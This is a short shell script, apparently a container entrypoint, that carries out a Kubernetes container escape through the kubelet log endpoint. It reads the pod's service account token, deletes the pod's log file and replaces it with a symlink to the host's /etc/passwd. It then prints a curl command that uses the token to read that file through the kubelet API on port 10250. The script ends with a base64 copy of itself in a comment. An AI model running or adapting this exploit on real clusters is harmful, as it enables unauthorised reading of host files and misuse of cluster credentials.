echo "'run.sh' start"

sleep 20

log_path=$(find /var/log/pods -name "0.log"|grep busybox)

#wget ipinfo.io
#external_ip=$(cat index.html |grep '"ip"'|awk -F'"' '{print $4}')

token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
tmp_path=$(echo $log_path|sed 's/\/var\/log//g')

echo -e "*** you can run below command to read '/etc/passwd' via kubelet api *** \n"
echo -e "curl https://$external_ip:10250/logs$tmp_path -H \"Authorization:Bearer $token\" -k \n"

sleep 60

rm -f $log_path && echo "rm success" && sleep 10
ln -sv /etc/passwd $log_path

tail -f /dev/null

# ZWNobyAiJ3J1bi5zaCcgc3RhcnQiCgpzbGVlcCAyMAoKbG9nX3BhdGg9JChmaW5kIC92YXIvbG9nL3BvZHMgLW5hbWUgIjAubG9nInxncmVwIGJ1c3lib3gpCgojd2dldCBpcGluZm8uaW8KI2V4dGVybmFsX2lwPSQoY2F0IGluZGV4Lmh0bWwgfGdyZXAgJyJpcCInfGF3ayAtRiciJyAne3ByaW50ICQ0fScpCgp0b2tlbj0kKGNhdCAvdmFyL3J1bi9zZWNyZXRzL2t1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvdG9rZW4pCnRtcF9wYXRoPSQoZWNobyAkbG9nX3BhdGh8c2VkICdzL1wvdmFyXC9sb2cvL2cnKQoKZWNobyAtZSAiKioqIHlvdSBjYW4gcnVuIGJlbG93IGNvbW1hbmQgdG8gcmVhZCAnL2V0Yy9wYXNzd2QnIHZpYSBrdWJlbGV0IGFwaSAqKiogXG4iCmVjaG8gLWUgImN1cmwgaHR0cHM6Ly8kZXh0ZXJuYWxfaXA6MTAyNTAvbG9ncyR0bXBfcGF0aCAtSCBcIkF1dGhvcml6YXRpb246QmVhcmVyICR0b2tlblwiIC1rIFxuIgoKc2xlZXAgNjAKCnJtIC1mICRsb2dfcGF0aCAmJiBlY2hvICJybSBzdWNjZXNzIiAmJiBzbGVlcCAxMApsbiAtc3YgL2V0Yy9wYXNzd2QgJGxvZ19wYXRoCgp0YWlsIC1mIC9kZXYvbnVsbAo=